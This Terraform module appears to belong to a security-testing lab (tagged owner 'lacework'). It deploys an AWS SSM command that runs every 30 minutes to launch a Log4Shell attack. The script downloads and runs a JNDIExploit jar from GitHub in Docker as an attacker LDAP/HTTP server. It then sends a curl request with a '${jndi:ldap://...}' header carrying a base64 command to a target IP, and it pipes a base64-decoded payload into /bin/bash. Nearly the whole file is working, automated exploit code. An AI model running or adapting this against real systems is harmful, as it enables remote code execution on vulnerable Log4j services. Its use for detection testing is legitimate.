locals {
    jdniexploit_url="https://github.com/credibleforce/jndi/raw/main/jndi.base64"
    image = "openjdk:11"
    name = "jdniexploit"
    attacker_http_port=var.attacker_http_port
    attacker_ldap_port=var.attacker_ldap_port
    attacker_ip=var.attacker_ip
    target_ip=var.target_ip
    target_port=var.target_port
    base64_log4shell_payload=base64encode(
        var.payload
    )
    command_payload=<<-EOT
    bash -c "wget ${local.jdniexploit_url} && base64 -d jndi.base64 > JNDIExploit.1.2.zip && unzip JNDIExploit.*.zip && rm *.zip && java -jar JNDIExploit-*.jar --ip ${local.attacker_ip} --httpPort ${local.attacker_http_port} --ldapPort ${local.attacker_ldap_port}"
    EOT
    payload = <<-EOT
    LOGFILE=/tmp/attacker_exec_docker_log4shell_attacker.log
    function log {
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
    }
    truncate -s 0 $LOGFILE
    log "Checking for docker..."
    while ! which docker; do
        log "docker not found...waiting"
        sleep 10
    done
    log "docker path: $(which docker)"
    if [[ `sudo docker ps | grep ${local.name}` ]]; then docker stop ${local.name}; fi
    log "$(echo 'docker run -d --name ${local.name} --rm -p ${local.attacker_http_port}:${local.attacker_http_port} -p ${local.attacker_ldap_port}:${local.attacker_ldap_port} ${local.image} ${local.command_payload}')"
    docker run -d --name ${local.name} --rm -p ${local.attacker_http_port}:${local.attacker_http_port} -p ${local.attacker_ldap_port}:${local.attacker_ldap_port} ${local.image} ${local.command_payload} >> $LOGFILE 2>&1
    docker ps -a >> $LOGFILE 2>&1
    log "payload: curl --verbose ${local.target_ip}:${local.target_port} -H 'X-Api-Version: $${jndi:ldap://${local.attacker_ip}:${local.attacker_ldap_port}/Basic/Command/Base64/${local.base64_log4shell_payload}}'"
    log "checking target: ${local.target_ip}:${local.target_port}"
    while ! nc -z -w 5 -vv ${local.target_ip} ${local.target_port} > /dev/null; do
        log "failed check - waiting for target";
        sleep 30;
    done;
    log "target available - sending payload";
    sleep 5;
    curl --verbose ${local.target_ip}:${local.target_port} -H 'X-Api-Version: $${jndi:ldap://${local.attacker_ip}:${local.attacker_ldap_port}/Basic/Command/Base64/${local.base64_log4shell_payload}}' >> $LOGFILE 2>&1;
    echo "\n" >> $LOGFILE
    log "payload sent sleeping..."
    log "done";
    EOT
    base64_payload = base64encode(local.payload)
}

resource "aws_ssm_document" "exec_docker_log4shell_attacker" {
  name          = "exec_docker_log4shell_attacker"
  document_type = "Command"

  content = jsonencode(
    {
        "schemaVersion": "2.2",
        "description": "start docker based log4shell exploit",
        "mainSteps": [
            {
                "action": "aws:runShellScript",
                "name": "exec_docker_log4shell_attacker",
                "precondition": {
                    "StringEquals": [
                        "platformType",
                        "Linux"
                    ]
                },
                "inputs": {
                    "timeoutSeconds": "1200",
                    "runCommand": [
                        "echo '${local.base64_payload}' | tee /tmp/payload_${basename(abspath(path.module))} | base64 -d | /bin/bash -"
                    ]
                }
            }
        ]
    })
}

resource "aws_resourcegroups_group" "exec_docker_log4shell_attacker" {
    name = "exec_docker_log4shell_attacker"

    resource_query {
        query = jsonencode(var.resource_query_exec_docker_log4shell_attacker)
    }

    tags = {
        billing = var.environment
        owner   = "lacework"
    }
}

resource "aws_ssm_association" "exec_docker_log4shell_attacker" {
    association_name = "exec_docker_log4shell_attacker"

    name = aws_ssm_document.exec_docker_log4shell_attacker.name

    targets {
        key = "resource-groups:Name"
        values = [
            aws_resourcegroups_group.exec_docker_log4shell_attacker.name,
        ]
    }

    compliance_severity = "HIGH"

    # every 30 minutes
    schedule_expression = "cron(0/30 * * * ? *)"
    
    # will apply when updated and interval when false
    apply_only_at_cron_interval = false
}